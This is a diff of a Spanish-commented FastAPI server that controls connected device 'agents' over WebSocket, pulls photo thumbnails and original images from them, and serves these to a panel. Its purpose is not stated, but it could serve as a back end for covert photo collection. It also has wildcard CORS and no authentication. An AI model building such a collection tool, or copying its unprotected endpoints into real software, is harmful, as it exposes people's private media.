@@ -6,18 +6,19 @@ from pydantic import BaseModel
 from typing import List, Dict, Any
 from urllib.parse import unquote
 
-app = FastAPI(title="Agente Control Backend (FINAL con Estado de Carga)")
+app = FastAPI(title="Agente Control Backend (vFINAL - Bajo Demanda)")
 app.add_middleware(
     CORSMiddleware, allow_origins=["*"], allow_credentials=True, allow_methods=["*"], allow_headers=["*"],
 )
 
 # --- "BASE DE DATOS" EN MEMORIA CON ESTADO ---
 connected_agents: Dict[str, Dict[str, Any]] = {}
-device_media_cache: Dict[str, Dict[str, str]] = {}
-# ¡NUEVO! Diccionario para rastrear el estado de la carga de miniaturas
+# Formato: { "device_id": { "filename.jpg": { "small_thumb_b64": "...", "original_b64": "..." } } }
+device_media_cache: Dict[str, Dict[str, Dict[str, str]]] = {}
+# Diccionario para rastrear el estado de la carga de miniaturas
 fetch_status: Dict[str, str] = {} # Ej: {"device_id": "loading" | "complete"}
 
-# --- MODELOS DE DATOS ---
+# --- MODELOS DE DATOS (DEFINEN LA ESTRUCTURA DE LOS DATOS) ---
 class Command(BaseModel):
     target_id: str
     action: str
@@ -31,7 +32,11 @@ class ThumbnailChunk(BaseModel):
     thumbnails: List[Thumbnail]
     is_final_chunk: bool
 
-# --- ENDPOINTS ---
+# --- ENDPOINTS (LAS "PUERTAS" DE LA API) ---
+
+@app.get("/")
+async def root():
+    return {"message": "Servidor del Agente de Control activo."}
 
 @app.websocket("/ws/{device_id}/{device_name:path}")
 async def websocket_endpoint(websocket: WebSocket, device_id: str, device_name: str):
@@ -41,7 +46,7 @@ async def websocket_endpoint(websocket: WebSocket, device_id: str, device_name: 
     connected_agents[device_id] = {"ws": websocket, "name": device_name_decoded}
     try:
         while True:
-            await websocket.receive_text()
+            await websocket.receive_text() # Mantiene la conexión viva
     except WebSocketDisconnect:
         name_to_print = connected_agents.get(device_id, {}).get("name", f"ID: {device_id}")
         print(f"[DESCONEXIÓN] Agente desconectado: '{name_to_print}'")
@@ -59,11 +64,9 @@ async def send_command_to_agent(command: Command):
     if not agent:
         return {"status": "error", "message": "Agente no conectado"}
     
-    # ¡LÓGICA MEJORADA! Al pedir miniaturas, reiniciamos todo.
     if command.action == "get_thumbnails":
         print(f"Limpiando caché y reiniciando estado para {command.target_id[:8]}.")
         device_media_cache[command.target_id] = {}
-        # Marcamos el estado como "cargando" para este dispositivo
         fetch_status[command.target_id] = "loading"
         
     try:
@@ -78,11 +81,12 @@ async def submit_media_chunk(device_id: str, chunk: ThumbnailChunk):
         device_media_cache[device_id] = {}
     
     for thumb in chunk.thumbnails:
+        # Solo guardamos la miniatura pequeña que nos envía la app
         device_media_cache[device_id][thumb.filename] = {"small_thumb_b64": thumb.small_thumb_b64}
         
     print(f"Recibidas {len(chunk.thumbnails)} miniaturas de {device_id[:8]}.")
     
-    # ¡LÓGICA MEJORADA! Si este es el último lote, actualizamos el estado.
+    # Si la app nos dice que este es el último lote, actualizamos el estado
     if chunk.is_final_chunk:
         fetch_status[device_id] = "complete"
         print(f"Recepción de lotes para {device_id[:8]} completada.")
@@ -93,21 +97,23 @@ async def submit_media_chunk(device_id: str, chunk: ThumbnailChunk):
 async def upload_original_file(device_id: str, filename: str, file: UploadFile = File(...)):
     decoded_filename = unquote(filename)
     if device_id not in device_media_cache or decoded_filename not in device_media_cache[device_id]:
-        return Response(content="Archivo no solicitado", status_code=400)
+        return Response(content="Archivo no solicitado o agente desconocido", status_code=400)
     
     file_bytes = await file.read()
     original_b64 = base64.b64encode(file_bytes).decode('utf-8')
+    
+    # Guardamos el original en la caché, junto a la miniatura que ya teníamos
     device_media_cache[device_id][decoded_filename]['original_b64'] = original_b64
     
     print(f"Recibido archivo original '{decoded_filename}' de {device_id[:8]}.")
     return {"status": "success"}
 
-# --- ¡RUTA MEJORADA PARA DEVOLVER EL ESTADO! ---
 @app.get("/api/get_media_list/{device_id}")
 async def get_media_list(device_id: str):
-    # Ahora devolvemos un objeto que incluye el estado y el diccionario de miniaturas
-    status = fetch_status.get(device_id, "complete") # Si no hay estado, asumimos que está completo
+    # El panel consultará esta ruta repetidamente
+    status = fetch_status.get(device_id, "complete")
     thumbnails = device_media_cache.get(device_id, {})
+    # Devolvemos el estado actual y las miniaturas que tengamos hasta ahora
     return {"status": status, "thumbnails": thumbnails}
 
 @app.get("/media/{device_id}/{filename:path}")
@@ -117,10 +123,10 @@ async def get_large_media(device_id: str, filename: str):
     media_item = cache.get(decoded_filename)
     
     if not media_item or 'original_b64' not in media_item:
-        return Response(content='{"detail":"Archivo original no disponible"}', status_code=404, media_type="application/json")
+        return Response(content='{"detail":"Archivo original no disponible en el servidor. Pide al agente que lo suba."}', status_code=404, media_type="application/json")
     
     try:
         image_bytes = base64.b64decode(media_item['original_b64'])
         return Response(content=image_bytes, media_type="image/jpeg")
     except Exception as e:
-        return Response(content=f'{{"detail":"Error: {e}"}}', status_code=500, media_type="application/json")
+        return Response(content=f'{{"detail":"Error al procesar la imagen: {e}"}}', status_code=500, media_type="application/json")
